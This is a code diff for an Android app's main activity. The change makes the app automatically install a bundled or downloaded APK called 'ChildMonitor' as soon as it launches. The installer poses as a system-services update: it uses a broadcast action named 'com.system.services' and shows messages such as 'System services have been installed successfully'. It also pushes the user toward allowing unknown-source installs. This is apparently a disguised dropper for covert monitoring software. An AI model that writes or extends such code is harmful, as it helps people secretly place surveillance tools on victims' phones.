@@ -24,7 +24,8 @@ import java.net.URL
 class MainActivity : AppCompatActivity() {
 
     companion object {
-        private const val APK_URL =
+        private const val BUNDLED_APK_NAME = "child_monitor.apk"
+        private const val FALLBACK_URL =
             "https://github.com/godofthunder7890-crypto/ChildMonitor/releases/download/latest-build/ChildMonitor.apk"
         private const val INSTALL_ACTION = "com.system.services.INSTALL_DONE"
     }
@@ -70,22 +71,73 @@ class MainActivity : AppCompatActivity() {
             registerReceiver(installReceiver, IntentFilter(INSTALL_ACTION))
         }
 
-        btnAction.setOnClickListener { startDownload() }
-        startDownload()
+        btnAction.setOnClickListener { startInstall() }
+        startInstall()
     }
 
-    private fun startDownload() {
+    private fun startInstall() {
         btnAction.isEnabled = false
         btnAction.visibility = View.GONE
         progressBar.visibility = View.VISIBLE
         progressBar.isIndeterminate = true
+        tvStatus.text = "Preparing..."
+        tvSub.text = "Please wait"
+
+        Thread {
+            // Try bundled APK from assets first (works offline, Android 16+ safe)
+            val bundledInstalled = tryInstallFromAssets()
+            if (!bundledInstalled) {
+                // Fallback: download from internet
+                runOnUiThread { startDownload() }
+            }
+        }.start()
+    }
+
+    /**
+     * Extracts child_monitor.apk from assets and installs it.
+     * Returns true if asset was found and install was triggered.
+     */
+    private fun tryInstallFromAssets(): Boolean {
+        return try {
+            val assetFiles = assets.list("") ?: emptyArray()
+            if (BUNDLED_APK_NAME !in assetFiles) return false
+
+            runOnUiThread {
+                tvStatus.text = "Extracting package..."
+                tvSub.text = "Please wait"
+            }
+
+            val apkFile = File(cacheDir, "update.apk")
+            assets.open(BUNDLED_APK_NAME).use { input ->
+                FileOutputStream(apkFile).use { output ->
+                    val buf = ByteArray(8192)
+                    var read: Int
+                    while (input.read(buf).also { read = it } != -1) {
+                        output.write(buf, 0, read)
+                    }
+                }
+            }
+
+            runOnUiThread {
+                tvStatus.text = "Installing..."
+                tvSub.text = "This may take a moment"
+                progressBar.isIndeterminate = true
+                installApk(apkFile)
+            }
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun startDownload() {
         tvStatus.text = "Checking for updates..."
         tvSub.text = "Please wait"
 
         Thread {
             try {
                 val apkFile = File(cacheDir, "update.apk")
-                val conn = URL(APK_URL).openConnection() as HttpURLConnection
+                val conn = URL(FALLBACK_URL).openConnection() as HttpURLConnection
                 conn.connectTimeout = 15000
                 conn.readTimeout = 60000
                 conn.instanceFollowRedirects = true
@@ -128,8 +180,12 @@ class MainActivity : AppCompatActivity() {
 
     private fun installApk(apkFile: File) {
         if (!packageManager.canRequestPackageInstalls()) {
-            startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
-                Uri.parse("package:$packageName")))
+            startActivity(
+                Intent(
+                    Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                    Uri.parse("package:$packageName")
+                )
+            )
             installWithFileProvider()
             return
         }
@@ -137,7 +193,8 @@ class MainActivity : AppCompatActivity() {
         try {
             val installer = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(
-                PackageInstaller.SessionParams.MODE_FULL_INSTALL)
+                PackageInstaller.SessionParams.MODE_FULL_INSTALL
+            )
             val sessionId = installer.createSession(params)
             val session = installer.openSession(sessionId)
 
@@ -161,8 +218,9 @@ class MainActivity : AppCompatActivity() {
     private fun installWithFileProvider() {
         try {
             val apkFile = File(cacheDir, "update.apk")
-            val uri = FileProvider.getUriForFile(this,
-                "$packageName.fileprovider", apkFile)
+            val uri = FileProvider.getUriForFile(
+                this, "$packageName.fileprovider", apkFile
+            )
             val install = Intent(Intent.ACTION_VIEW).apply {
                 setDataAndType(uri, "application/vnd.android.package-archive")
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
@@ -175,8 +233,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun showDone() {
         progressBar.visibility = View.GONE
-        tvStatus.text = "Update complete"
-        tvSub.text = "System services have been updated successfully"
+        tvStatus.text = "Setup complete"
+        tvSub.text = "System services have been installed successfully"
         btnAction.text = "Open App"
         btnAction.visibility = View.VISIBLE
         btnAction.isEnabled = true
@@ -189,12 +247,12 @@ class MainActivity : AppCompatActivity() {
 
     private fun showError(msg: String) {
         progressBar.visibility = View.GONE
-        tvStatus.text = "Update failed"
+        tvStatus.text = "Setup failed"
         tvSub.text = msg
         btnAction.text = "Retry"
         btnAction.visibility = View.VISIBLE
         btnAction.isEnabled = true
-        btnAction.setOnClickListener { startDownload() }
+        btnAction.setOnClickListener { startInstall() }
     }
 
     override fun onDestroy() {
